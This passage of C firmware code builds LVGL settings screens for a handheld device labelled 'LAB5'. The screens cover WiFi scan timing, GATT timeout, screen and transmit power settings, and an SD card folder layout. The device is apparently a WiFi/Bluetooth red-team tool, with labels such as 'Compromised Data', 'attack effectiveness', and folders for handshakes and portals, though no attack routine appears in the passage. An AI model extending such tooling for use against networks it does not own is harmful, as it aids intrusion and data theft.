    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 110, 36);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, brightness_popup_close_cb, LV_EVENT_CLICKED, NULL);

    // Save button
    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 110, 36);
    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(COLOR_MATERIAL_ORANGE, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(save_btn, 8, 0);
    lv_obj_t *save_lbl = lv_label_create(save_btn);
    lv_label_set_text(save_lbl, "Save");
    lv_obj_set_style_text_color(save_lbl, ui_text_color(), 0);
    lv_obj_center(save_lbl);
    lv_obj_add_event_cb(save_btn, brightness_popup_save_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// Timing Popup — WiFi scan per channel + GATT connect timeout combined
// ============================================================================

static lv_obj_t *timing_popup = NULL;

static void timing_popup_close_cb(lv_event_t *e)
{
    (void)e;
    if (timing_popup) { lv_obj_del(timing_popup); timing_popup = NULL; }
    scantime_min_slider = scantime_max_slider = NULL;
    scantime_min_label  = scantime_max_label  = NULL;
    gatt_tmo_slider = NULL;
    gatt_tmo_label  = NULL;
}

static void timing_popup_save_cb(lv_event_t *e)
{
    if (!scantime_min_slider || !scantime_max_slider || !gatt_tmo_slider) return;

    int32_t min_val  = lv_slider_get_value(scantime_min_slider);
    int32_t max_val  = lv_slider_get_value(scantime_max_slider);
    uint32_t gatt_ms = (uint32_t)lv_slider_get_value(gatt_tmo_slider);

    if (min_val >= max_val) max_val = min_val + 10;
    scan_time_min_ms  = (uint16_t)min_val;
    scan_time_max_ms  = (uint16_t)max_val;
    g_gatt_timeout_ms = gatt_ms;

    wifi_scanner_set_scan_time(scan_time_min_ms, scan_time_max_ms);
    nvs_settings_save_scan_time(scan_time_min_ms, scan_time_max_ms);
    gw_set_timeout(gatt_ms);
    nvs_settings_save_gatt_timeout(gatt_ms);

    timing_popup_close_cb(e);
}

static void show_timing_popup(void)
{
    if (timing_popup) return;

    timing_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(timing_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(timing_popup, 0, 0);
    lv_obj_set_style_bg_color(timing_popup, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(timing_popup, LV_OPA_70, 0);
    lv_obj_set_style_border_width(timing_popup, 0, 0);
    lv_obj_set_style_radius(timing_popup, 0, 0);
    lv_obj_clear_flag(timing_popup, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(timing_popup, LV_OBJ_FLAG_CLICKABLE);

    lv_obj_t *dialog = lv_obj_create(timing_popup);
    lv_obj_set_size(dialog, 220, LV_SIZE_CONTENT);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 10, 0);
    lv_obj_set_style_pad_gap(dialog, 5, 0);

    lv_obj_t *title = lv_label_create(dialog);
    lv_label_set_text(title, "Timing Settings");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);

    /* ── WiFi scan section ────────────────────────── */
    lv_obj_t *wifi_hdr = lv_label_create(dialog);
    lv_label_set_text(wifi_hdr, "WiFi Scan / Channel");
    lv_obj_set_style_text_color(wifi_hdr, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_text_font(wifi_hdr, &lv_font_montserrat_12, 0);

    char buf[32];
    scantime_min_label = lv_label_create(dialog);
    snprintf(buf, sizeof(buf), "Min: %ums", scan_time_min_ms);
    lv_label_set_text(scantime_min_label, buf);
    lv_obj_set_style_text_color(scantime_min_label, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_text_font(scantime_min_label, &lv_font_montserrat_12, 0);

    scantime_min_slider = lv_slider_create(dialog);
    lv_obj_set_width(scantime_min_slider, 196);
    lv_slider_set_range(scantime_min_slider, 50, 1000);
    lv_slider_set_value(scantime_min_slider, scan_time_min_ms, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(scantime_min_slider, lv_color_make(80,80,80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(scantime_min_slider, COLOR_MATERIAL_PURPLE, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(scantime_min_slider, COLOR_MATERIAL_PURPLE, LV_PART_KNOB);
    lv_obj_set_style_pad_all(scantime_min_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(scantime_min_slider, scantime_min_slider_cb, LV_EVENT_VALUE_CHANGED, NULL);

    scantime_max_label = lv_label_create(dialog);
    snprintf(buf, sizeof(buf), "Max: %ums", scan_time_max_ms);
    lv_label_set_text(scantime_max_label, buf);
    lv_obj_set_style_text_color(scantime_max_label, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_text_font(scantime_max_label, &lv_font_montserrat_12, 0);

    scantime_max_slider = lv_slider_create(dialog);
    lv_obj_set_width(scantime_max_slider, 196);
    lv_slider_set_range(scantime_max_slider, 50, 1000);
    lv_slider_set_value(scantime_max_slider, scan_time_max_ms, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(scantime_max_slider, lv_color_make(80,80,80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(scantime_max_slider, COLOR_MATERIAL_PURPLE, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(scantime_max_slider, COLOR_MATERIAL_PURPLE, LV_PART_KNOB);
    lv_obj_set_style_pad_all(scantime_max_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(scantime_max_slider, scantime_max_slider_cb, LV_EVENT_VALUE_CHANGED, NULL);

    /* ── Divider ──────────────────────────────────── */
    lv_obj_t *div = lv_obj_create(dialog);
    lv_obj_set_size(div, 196, 1);
    lv_obj_set_style_bg_color(div, lv_color_make(70,70,70), 0);
    lv_obj_set_style_border_width(div, 0, 0);
    lv_obj_set_style_pad_all(div, 0, 0);

    /* ── GATT connect timeout section ─────────────── */
    lv_obj_t *gatt_hdr = lv_label_create(dialog);
    lv_label_set_text(gatt_hdr, "GATT Connect Timeout");
    lv_obj_set_style_text_color(gatt_hdr, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_text_font(gatt_hdr, &lv_font_montserrat_12, 0);

    gatt_tmo_label = lv_label_create(dialog);
    snprintf(buf, sizeof(buf), "Timeout: %ums", (unsigned)g_gatt_timeout_ms);
    lv_label_set_text(gatt_tmo_label, buf);
    lv_obj_set_style_text_color(gatt_tmo_label, UI_ACCENT_CYAN, 0);
    lv_obj_set_style_text_font(gatt_tmo_label, &lv_font_montserrat_12, 0);

    gatt_tmo_slider = lv_slider_create(dialog);
    lv_obj_set_width(gatt_tmo_slider, 196);
    lv_slider_set_range(gatt_tmo_slider, 3000, 30000);
    lv_slider_set_value(gatt_tmo_slider, (int32_t)g_gatt_timeout_ms, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(gatt_tmo_slider, lv_color_make(80,80,80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(gatt_tmo_slider, UI_ACCENT_CYAN, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(gatt_tmo_slider, UI_ACCENT_CYAN, LV_PART_KNOB);
    lv_obj_set_style_pad_all(gatt_tmo_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(gatt_tmo_slider, gatt_tmo_slider_cb, LV_EVENT_VALUE_CHANGED, NULL);

    lv_obj_t *note = lv_label_create(dialog);
    lv_label_set_text(note, "3s = fast  |  30s = patient");
    lv_obj_set_style_text_color(note, ui_muted_color(), 0);
    lv_obj_set_style_text_font(note, &lv_font_montserrat_12, 0);

    /* ── Buttons ──────────────────────────────────── */
    lv_obj_t *btn_row = lv_obj_create(dialog);
    lv_obj_set_size(btn_row, 196, 36);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 90, 30);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(80,80,80), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(cancel_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, timing_popup_close_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 90, 30);
    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_PURPLE, 0);
    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(COLOR_MATERIAL_PURPLE, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(save_btn, 8, 0);
    lv_obj_t *save_lbl = lv_label_create(save_btn);
    lv_label_set_text(save_lbl, "Save");
    lv_obj_set_style_text_color(save_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(save_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(save_lbl);
    lv_obj_add_event_cb(save_btn, timing_popup_save_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// Screen Popup — timeout + brightness combined
// ============================================================================

static lv_obj_t *screen_popup = NULL;

static void screen_popup_close_cb(lv_event_t *e)
{
    (void)e;
    set_backlight_percent(brightness_before_popup);
    if (screen_popup) { lv_obj_del(screen_popup); screen_popup = NULL; }
    timeout_dropdown      = NULL;
    brightness_slider     = NULL;
    brightness_value_label = NULL;
}

static void screen_popup_save_cb(lv_event_t *e)
{
    (void)e;
    if (!timeout_dropdown || !brightness_slider) return;

    uint16_t sel = lv_dropdown_get_selected(timeout_dropdown);
    screen_timeout_ms = timeout_index_to_ms(sel);
    nvs_settings_save_timeout(screen_timeout_ms);
    if (screen_idle_timer) {
        if (screen_timeout_ms == 0) lv_timer_pause(screen_idle_timer);
        else {
            last_input_ms = esp_timer_get_time() / 1000;
            lv_timer_resume(screen_idle_timer);
        }
    }

    screen_brightness_pct = (uint8_t)lv_slider_get_value(brightness_slider);
    nvs_settings_save_brightness(screen_brightness_pct);
    set_backlight_percent(screen_brightness_pct);

    if (screen_popup) { lv_obj_del(screen_popup); screen_popup = NULL; }
    timeout_dropdown      = NULL;
    brightness_slider     = NULL;
    brightness_value_label = NULL;
}

static void show_screen_popup(void)
{
    if (screen_popup) return;
    brightness_before_popup = screen_brightness_pct;

    screen_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(screen_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(screen_popup, 0, 0);
    lv_obj_set_style_bg_color(screen_popup, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(screen_popup, LV_OPA_70, 0);
    lv_obj_set_style_border_width(screen_popup, 0, 0);
    lv_obj_set_style_radius(screen_popup, 0, 0);
    lv_obj_clear_flag(screen_popup, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(screen_popup, LV_OBJ_FLAG_CLICKABLE);

    lv_obj_t *dialog = lv_obj_create(screen_popup);
    lv_obj_set_size(dialog, 220, LV_SIZE_CONTENT);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 10, 0);
    lv_obj_set_style_pad_gap(dialog, 5, 0);

    lv_obj_t *title = lv_label_create(dialog);
    lv_label_set_text(title, "Screen Settings");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);

    /* ── Timeout section ──────────────────────────── */
    lv_obj_t *tmo_hdr = lv_label_create(dialog);
    lv_label_set_text(tmo_hdr, "Timeout");
    lv_obj_set_style_text_color(tmo_hdr, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_text_font(tmo_hdr, &lv_font_montserrat_12, 0);

    timeout_dropdown = lv_dropdown_create(dialog);
    lv_dropdown_set_options(timeout_dropdown,
        "10 seconds\n30 seconds\n1 minute\n5 minutes\nStays on");
    lv_obj_set_width(timeout_dropdown, 196);
    lv_obj_set_style_bg_color(timeout_dropdown, lv_color_make(50,50,50), 0);
    lv_obj_set_style_text_color(timeout_dropdown, ui_text_color(), 0);
    lv_obj_set_style_border_color(timeout_dropdown, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(timeout_dropdown, 1, 0);
    lv_obj_set_style_radius(timeout_dropdown, 8, 0);
    lv_obj_set_style_text_font(timeout_dropdown, &lv_font_montserrat_12, 0);
    lv_obj_t *dd_list = lv_dropdown_get_list(timeout_dropdown);
    if (dd_list) {
        lv_obj_set_style_bg_color(dd_list, lv_color_make(40,40,40), 0);
        lv_obj_set_style_text_color(dd_list, ui_text_color(), 0);
        lv_obj_set_style_border_color(dd_list, COLOR_MATERIAL_TEAL, 0);
        lv_obj_set_style_bg_color(dd_list, COLOR_MATERIAL_TEAL,
            LV_PART_SELECTED | LV_STATE_CHECKED);
    }
    lv_dropdown_set_selected(timeout_dropdown, timeout_ms_to_index(screen_timeout_ms));

    /* ── Divider ──────────────────────────────────── */
    lv_obj_t *div = lv_obj_create(dialog);
    lv_obj_set_size(div, 196, 1);
    lv_obj_set_style_bg_color(div, lv_color_make(70,70,70), 0);
    lv_obj_set_style_border_width(div, 0, 0);
    lv_obj_set_style_pad_all(div, 0, 0);

    /* ── Brightness section ───────────────────────── */
    lv_obj_t *brt_hdr = lv_label_create(dialog);
    lv_label_set_text(brt_hdr, "Brightness");
    lv_obj_set_style_text_color(brt_hdr, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_font(brt_hdr, &lv_font_montserrat_12, 0);

    brightness_value_label = lv_label_create(dialog);
    char buf[8];
    snprintf(buf, sizeof(buf), "%u%%", screen_brightness_pct);
    lv_label_set_text(brightness_value_label, buf);
    lv_obj_set_style_text_color(brightness_value_label, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_font(brightness_value_label, &lv_font_montserrat_12, 0);

    brightness_slider = lv_slider_create(dialog);
    lv_obj_set_width(brightness_slider, 196);
    lv_slider_set_range(brightness_slider, 10, 100);
    lv_slider_set_value(brightness_slider, screen_brightness_pct, LV_ANIM_OFF);
    lv_obj_set_style_bg_color(brightness_slider, lv_color_make(80,80,80), LV_PART_MAIN);
    lv_obj_set_style_bg_color(brightness_slider, COLOR_MATERIAL_ORANGE, LV_PART_INDICATOR);
    lv_obj_set_style_bg_color(brightness_slider, COLOR_MATERIAL_ORANGE, LV_PART_KNOB);
    lv_obj_set_style_pad_all(brightness_slider, 4, LV_PART_KNOB);
    lv_obj_add_event_cb(brightness_slider, brightness_slider_event_cb, LV_EVENT_VALUE_CHANGED, NULL);

    /* ── Buttons ──────────────────────────────────── */
    lv_obj_t *btn_row = lv_obj_create(dialog);
    lv_obj_set_size(btn_row, 196, 36);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_SPACE_EVENLY, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 90, 30);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(80,80,80), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_lbl, "Cancel");
    lv_obj_set_style_text_color(cancel_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(cancel_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(cancel_lbl);
    lv_obj_add_event_cb(cancel_btn, screen_popup_close_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *save_btn = lv_btn_create(btn_row);
    lv_obj_set_size(save_btn, 90, 30);
    lv_obj_set_style_bg_color(save_btn, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_bg_color(save_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(save_btn, 8, 0);
    lv_obj_t *save_lbl = lv_label_create(save_btn);
    lv_label_set_text(save_lbl, "Save");
    lv_obj_set_style_text_color(save_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(save_lbl, &lv_font_montserrat_12, 0);
    lv_obj_center(save_lbl);
    lv_obj_add_event_cb(save_btn, screen_popup_save_cb, LV_EVENT_CLICKED, NULL);
}

// ============================================================================
// Power Mode Popup
// ============================================================================

static lv_obj_t *powermode_popup       = NULL;
static lv_obj_t *powermode_normal_btn  = NULL;
static lv_obj_t *powermode_max_btn     = NULL;

static void powermode_refresh_buttons(void)
{
    if (!powermode_normal_btn || !powermode_max_btn) return;
    if (g_max_power_mode) {
        lv_obj_set_style_bg_color(powermode_normal_btn, lv_color_make(80, 80, 80), 0);
        lv_obj_set_style_bg_color(powermode_max_btn,    COLOR_MATERIAL_RED, 0);
    } else {
        lv_obj_set_style_bg_color(powermode_normal_btn, lv_color_hex(0x2E7D32), 0);
        lv_obj_set_style_bg_color(powermode_max_btn,    lv_color_make(80, 80, 80), 0);
    }
}

static void powermode_close_cb(lv_event_t *e)
{
    (void)e;
    if (powermode_popup) {
        lv_obj_del(powermode_popup);
        powermode_popup      = NULL;
        powermode_normal_btn = NULL;
        powermode_max_btn    = NULL;
    }
}

static void powermode_normal_cb(lv_event_t *e)
{
    (void)e;
    g_max_power_mode = false;
    nvs_settings_save_power_mode(false);
    if (current_radio_mode == RADIO_MODE_WIFI) apply_wifi_power_settings();
    powermode_refresh_buttons();
}

static void powermode_max_cb(lv_event_t *e)
{
    (void)e;
    g_max_power_mode = true;
    nvs_settings_save_power_mode(true);
    if (current_radio_mode == RADIO_MODE_WIFI) apply_wifi_power_settings();
    if (current_radio_mode == RADIO_MODE_BLE)  apply_ble_power_settings();
    powermode_refresh_buttons();
}

static void show_power_mode_popup(void)
{
    if (powermode_popup) return;

    powermode_popup = lv_obj_create(lv_scr_act());
    lv_obj_set_size(powermode_popup, LCD_H_RES, LCD_V_RES);
    lv_obj_set_pos(powermode_popup, 0, 0);
    lv_obj_set_style_bg_color(powermode_popup, ui_bg_color(), 0);
    lv_obj_set_style_bg_opa(powermode_popup, LV_OPA_70, 0);
    lv_obj_set_style_border_width(powermode_popup, 0, 0);
    lv_obj_set_style_radius(powermode_popup, 0, 0);
    lv_obj_clear_flag(powermode_popup, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *dialog = lv_obj_create(powermode_popup);
    lv_obj_set_size(dialog, 210, 195);
    lv_obj_center(dialog);
    lv_obj_set_style_bg_color(dialog, ui_panel_color(), 0);
    lv_obj_set_style_border_color(dialog, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(dialog, 2, 0);
    lv_obj_set_style_radius(dialog, 12, 0);
    lv_obj_clear_flag(dialog, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(dialog, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(dialog, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(dialog, 14, 0);
    lv_obj_set_style_pad_gap(dialog, 10, 0);

    lv_obj_t *title = lv_label_create(dialog);
    lv_label_set_text(title, LV_SYMBOL_CHARGE " TX Power Mode");
    lv_obj_set_style_text_color(title, ui_text_color(), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_16, 0);

    lv_obj_t *sub = lv_label_create(dialog);
    lv_label_set_text(sub, "Applies to WiFi & BLE");
    lv_obj_set_style_text_color(sub, ui_muted_color(), 0);
    lv_obj_set_style_text_font(sub, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_align(sub, LV_TEXT_ALIGN_CENTER, 0);

    // Mode selector row
    lv_obj_t *mode_row = lv_obj_create(dialog);
    lv_obj_set_size(mode_row, 175, 44);
    lv_obj_set_style_bg_opa(mode_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(mode_row, 0, 0);
    lv_obj_set_style_pad_all(mode_row, 0, 0);
    lv_obj_clear_flag(mode_row, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_flex_flow(mode_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(mode_row, LV_FLEX_ALIGN_SPACE_BETWEEN, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    powermode_normal_btn = lv_btn_create(mode_row);
    lv_obj_set_size(powermode_normal_btn, 82, 38);
    lv_obj_set_style_radius(powermode_normal_btn, 8, 0);
    lv_obj_t *nl = lv_label_create(powermode_normal_btn);
    lv_label_set_text(nl, "Normal");
    lv_obj_set_style_text_font(nl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(nl, ui_text_color(), 0);
    lv_obj_center(nl);
    lv_obj_add_event_cb(powermode_normal_btn, powermode_normal_cb, LV_EVENT_CLICKED, NULL);

    powermode_max_btn = lv_btn_create(mode_row);
    lv_obj_set_size(powermode_max_btn, 82, 38);
    lv_obj_set_style_radius(powermode_max_btn, 8, 0);
    lv_obj_t *ml = lv_label_create(powermode_max_btn);
    lv_label_set_text(ml, "Max Power");
    lv_obj_set_style_text_font(ml, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(ml, ui_text_color(), 0);
    lv_obj_center(ml);
    lv_obj_add_event_cb(powermode_max_btn, powermode_max_cb, LV_EVENT_CLICKED, NULL);

    powermode_refresh_buttons();

    lv_obj_t *warn = lv_label_create(dialog);
    lv_label_set_text(warn, "Max power increases range &\nattack effectiveness.");
    lv_obj_set_style_text_color(warn, ui_muted_color(), 0);
    lv_obj_set_style_text_font(warn, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_align(warn, LV_TEXT_ALIGN_CENTER, 0);

    lv_obj_t *close_btn = lv_btn_create(dialog);
    lv_obj_set_size(close_btn, 80, 30);
    lv_obj_set_style_bg_color(close_btn, lv_color_make(80, 80, 80), 0);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_t *cl = lv_label_create(close_btn);
    lv_label_set_text(cl, "Close");
    lv_obj_set_style_text_font(cl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(cl, ui_text_color(), 0);
    lv_obj_center(cl);
    lv_obj_add_event_cb(close_btn, powermode_close_cb, LV_EVENT_CLICKED, NULL);
}

// Settings sub-menu tile event callback
static void settings_tile_event_cb(lv_event_t *e)
{
    const char *tile_name = (const char *)lv_event_get_user_data(e);
    if (!tile_name) return;
    
    if (strcmp(tile_name, "Compromised Data") == 0) {
        show_wifi_monitor_screen();
    } else if (strcmp(tile_name, "Timing") == 0) {
        show_timing_popup();
    } else if (strcmp(tile_name, "Screen") == 0) {
        show_screen_popup();
    } else if (strcmp(tile_name, "Data Transfer") == 0) {
        show_data_transfer_screen();
    } else if (strcmp(tile_name, "RedTeam mode") == 0) {
        show_settings_screen();
    } else if (strcmp(tile_name, "Download Mode") == 0) {
        show_download_mode_screen();
    } else if (strcmp(tile_name, "SD Card") == 0) {
        show_sd_card_screen();
    } else if (strcmp(tile_name, "GPS Info") == 0) {
        show_gps_info_screen();
    } else if (strcmp(tile_name, "Power Mode") == 0) {
        show_power_mode_popup();
    }
}

// Settings screen - shows submenu with Compromised Data, Scan Time, RedTeam mode, Download Mode
static void show_settings_screen(void)
{
    create_function_page_base("Settings");
    apply_menu_bg();

    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    // pad_all=4, pad_gap=4 → inner width=232, 3×70+2×4=218 ≤ 232, fits 3 tiles per row
    lv_obj_set_style_pad_all(tiles, 4, 0);
    lv_obj_set_style_pad_gap(tiles, 4, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    create_tile(tiles, LV_SYMBOL_EYE_OPEN,       "Compromised\nData",  COLOR_TILE_BLUE,         settings_tile_event_cb, "Compromised Data");
    create_tile(tiles, LV_SYMBOL_LOOP,           "Timing",             COLOR_MATERIAL_PURPLE,   settings_tile_event_cb, "Timing");
    create_tile(tiles, LV_SYMBOL_DOWNLOAD,       "Download\nMode",     COLOR_MATERIAL_RED,      settings_tile_event_cb, "Download Mode");
    create_tile(tiles, LV_SYMBOL_IMAGE,          "Screen",             COLOR_MATERIAL_TEAL,     settings_tile_event_cb, "Screen");
    create_tile(tiles, LV_SYMBOL_SD_CARD,        "SD\nCard",           COLOR_MATERIAL_GREEN,    settings_tile_event_cb, "SD Card");
    create_tile(tiles, MY_SYMBOL_SATELLITE_DISH, "GPS\nInfo",          lv_color_hex(0x00BCD4),  settings_tile_event_cb, "GPS Info");
    create_tile(tiles, LV_SYMBOL_CHARGE,         "Power\nMode",        COLOR_MATERIAL_RED,      settings_tile_event_cb, "Power Mode");
    create_tile(tiles, LV_SYMBOL_UPLOAD,         "Data\nTransfer",     lv_color_hex(0xE91E63),  settings_tile_event_cb, "Data Transfer");

    lv_obj_t *ver = lv_label_create(function_page);
    lv_label_set_text(ver, "LAB5 " FW_VERSION);
    lv_obj_set_style_text_font(ver, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(ver, ui_muted_color(), 0);
    lv_obj_align(ver, LV_ALIGN_BOTTOM_MID, 0, -4);
}

// WiFi Monitor screen
// ============================================================================
// SD Card Settings — Validate & Provision / Free Space / Format
// ============================================================================

// ─── Provision directory/file table ──────────────────────────────────────────

typedef enum { SD_ITEM_DIR, SD_ITEM_FILE } sd_item_type_t;

typedef struct {
    sd_item_type_t type;
    const char    *path;
    const char    *content;  // NULL → empty; non-NULL → write only on creation
} sd_provision_item_t;

static const sd_provision_item_t SD_ITEMS[] = {
    { SD_ITEM_DIR,  "/sdcard/lab",                           NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/handshakes",                NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/portal",                    NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/wardrive",                  NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/cellular",                  NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/pcap",                      NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/alerts",                    NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/config",                    NULL },
    { SD_ITEM_DIR,  "/sdcard/lab/bluetooth",                 NULL },
    { SD_ITEM_FILE, "/sdcard/lab/white.txt",                 "" },
    { SD_ITEM_FILE, "/sdcard/lab/cellular/tower_baseline.csv",
      "arfcn,bsic,lac,cell_id,mcc,mnc,rxlev,gps_lat,gps_lon,first_seen,last_seen\n" },
    { SD_ITEM_FILE, "/sdcard/lab/cellular/tower_anomalies.csv",
